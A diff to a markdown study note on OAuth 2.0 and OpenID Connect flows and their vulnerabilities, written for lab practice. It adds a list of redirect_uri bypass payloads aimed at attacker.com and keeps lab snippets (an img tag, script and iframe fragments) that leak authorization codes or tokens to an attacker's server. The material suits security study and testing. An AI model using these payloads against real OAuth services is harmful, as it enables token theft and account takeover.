@@ -19,20 +19,20 @@
 * Uses 'scope' parameter to specify the data it wants to access and what kind of operation it does on the data.
 * eg: `scope=contacts`, `scope=contacts.read` or might provide the full URI
 
-## Authorization Code Grant Type&#x20;
+## Authorization Code Grant Type
 
 * #### Authorization Request <sup><sub>(via user browser)<sub></sup>
-  * Client application sends request to the OAuth service's "`/authorization`" endpoint asking permission to access user data.&#x20;
+  * Client application sends request to the OAuth service's "`/authorization`" endpoint asking permission to access user data.
   * eg: `/authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24`
   * `client_id` -> unique identifier of client app
-  * `redirect_uri` -> user's browser should be redirected when sending the authorization code to client application&#x20;
+  * `redirect_uri` -> user's browser should be redirected when sending the authorization code to client application
   * `response_type` -> response expected and also determines the flow to initiate. If authorization code grant type, it should be "code".
   * `scope` -> specify the subset of data client wants to access.
   * `state` -> Stores a unique, unguessable value that is tied to the current session on the client application which has an expiry. Acts as a CSRF token.
 * #### User Login and Consent
   * When the authorization server receives the initial request, it will redirect user to a login page and asked to log in to their account with the OAuth provider.
 * #### Authorization Code Grant <sup><sub>(via user browser)<sub></sup>
-  * After user provide consent and authenticates, browser redirects to the URI mentioned in redirect\_uri. (`/callback`)&#x20;
+  * After user provide consent and authenticates, browser redirects to the URI mentioned in redirect\_uri. (`/callback`)
   * Request will contain the auth `code` and depending on config the `state` Params.
 * #### Access Token Request <sup><sub>(app server to oauth server)<sub></sup>
   * Sends a server-to-server POST request to the OAuth `/token` endpoint. Communications from this point takes place in a secure channel & cannot be controlled by an attacker.
@@ -48,7 +48,7 @@
 
 * Every communication happens via user's browser and can be observed by an attacker
 * Client app receives the access token immediately after the user gives their consent.
-* Suited for single-page & native desktop apps, which cannot easily store the `client_secret` on the back-end.&#x20;
+* Suited for single-page & native desktop apps, which cannot easily store the `client_secret` on the back-end.
 * #### Authorization Request
   * Same as authorization code grant type except the `response_type` should be set to `token`.
 * #### User Login and Consent
@@ -68,7 +68,7 @@
 * After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint.
 * Once it receives data, client application uses it in place of a username to log the user in. The access token that it received is often used as password.
 
-## OAuth Auth Vulnerabilities&#x20;
+## OAuth Auth Vulnerabilities
 
 * Arises since the specification is relatively vague and flexible by design.
 
@@ -93,21 +93,50 @@
 ### Vulnerabilities in the OAuth Service <sup><sub>(Leak authorization codes & access tokens)<sub></sup>
 
 * #### Flawed `redirect_uri` Validation
-  * If the OAuth service fails to validate redirect\_URI properly, an attacker can construct CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect\_uri&#x20;
+  * If the OAuth service fails to validate redirect\_URI properly, an attacker can construct CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect\_uri
   * Using state or nonce protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
-  * More secure authorization servers will require a redirect\_uri parameter to be sent when exchanging the code as well.&#x20;
+  * More secure authorization servers will require a redirect\_uri parameter to be sent when exchanging the code as well.
   * **Bypasses**
     * Try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
     * Append extra values to the default redirect\_uri parameter
-    * EG: h`ttps://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
+    * eg: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
     * Perform server-side parameter pollution where you add repeat the redirect\_uri parameter and see which value does the Oauth service validate and which is used to send the auth code.
     * Change response\_mode from query to fragment can sometimes alter the parsing of the redirect\_uri, allowing to submit URIs that was being blocked
     * Lab - Modify the initial redirect\_uri parameter in the `/auth` endpoint to contain attacker controlled domain and perform a CSRF attack which will send the Auth code to attacker's server.
+
+<details>
+
+<summary>Payloads</summary>
+
+```html
+redirect_uri=https://victim.com/redirect?url=https://attacker.com
+redirect_uri=https://victim.com/../../../../../attacker.com
+redirect_uri=https://victim.com&redirect_uri=https://attacker.com
+redirect_uri=https://victim.com%00https://attacker.com
+redirect_uri=https%3A%2F%2Fvictim.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fattacker.com
+redirect_uri=https://victim.com#https://attacker.com
+redirect_uri=https://victim.com?redirect=https://attacker.com
+redirect_uri=https://other.com/redirect?url=https://attacker.com
+redirect_uri=https://victim.com/#https://attacker.com
+redirect_uri=http://https://attacker.com
+redirect_uri=https://victim.com?context=https://attacker.com
+redirect_uri=https://victim.com.attacker.com
+redirect_uri=https://victim.com@attacker.com
+redirect_uri=https://victim.com\@attacker.com
+redirect_uri=https://victim.com%0A%0Dhttps://attacker.com
+redirect_uri=https://victim.com?@attacker.com
+redirect_uri=https://victim.com&state=//attacker.com
+redirect_uri=https://victim.com&state=%40attacker.com
+redirect_uri=https://victim.com&state=../../../../../attacker.com
+```
+
+</details>
+
 * #### Stealing Codes and Access Tokens via proxy page
   * You may be able to use directory traversal tricks to supply any arbitrary path on the domain for redirect
   * XSS vulnerabilities
   * HTML injection - point redirect\_uri parameter to a page where you can inject HTML content, we could leak code via the Referrer header.
-  * eg:  `<img src="evil-user.net">`When attempting to fetch image, some browsers (Firefox) will send full URL in the Referrer header.
+  * eg: `<img src="evil-user.net">`When attempting to fetch image, some browsers (Firefox) will send full URL in the Referrer header.
   * Lab - Modify the redirect\_uri to contain an endpoint within the app that is vulnerable to open redirect which forces the OAUTH service to send the code/token to the attacker's server. Using the code/token we can exploit further. Bypass an redirect\_uri check using directory traversal or other techniques.
   * ```html
     <script>
@@ -118,7 +147,7 @@
         }
     </script>
     ```
-  * Lab- OAuth service is vulnerable to directory traversal. Here the client app allows web pages to be loaded in iframe which can be used to provide the OAuth url and modify the redirect\_uri to contain a page within the client app and setup a event listener to send the URL contents to attacker's server.&#x20;
+  * Lab- OAuth service is vulnerable to directory traversal. Here the client app allows web pages to be loaded in iframe which can be used to provide the OAuth url and modify the redirect\_uri to contain a page within the client app and setup a event listener to send the URL contents to attacker's server.
   * ```html
     <iframe src='OAUTH_URL with modified redirect_URI'></iframe>
     <script>
@@ -144,7 +173,7 @@
 
 ## Unverified User Registration
 
-* Client app makes the implicit assumption that the information stored by the OAuth provider is correct&#x20;
+* Client app makes the implicit assumption that the information stored by the OAuth provider is correct
 * Websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address
 * Attacker can exploit by registering an account with the OAuth provider using the same details as a target user, such as a known email address
 
@@ -182,7 +211,7 @@
 * JWT payload contains list of claims based on scope initially requested. Also contains info about how & when the user last authenticated by the OAuth service
 * eg: `response_type=id_token` <sup><sub>(Token/code)<sub></sup>
 
-## Identifying OpenID Connect&#x20;
+## Identifying OpenID Connect
 
 * Look for the keyword 'openid' in scope (eg: openid profile/email.address/phone)
 * Try adding the 'openid' scope or changing the response type to 'id\_token' and observing whether this results in an error.
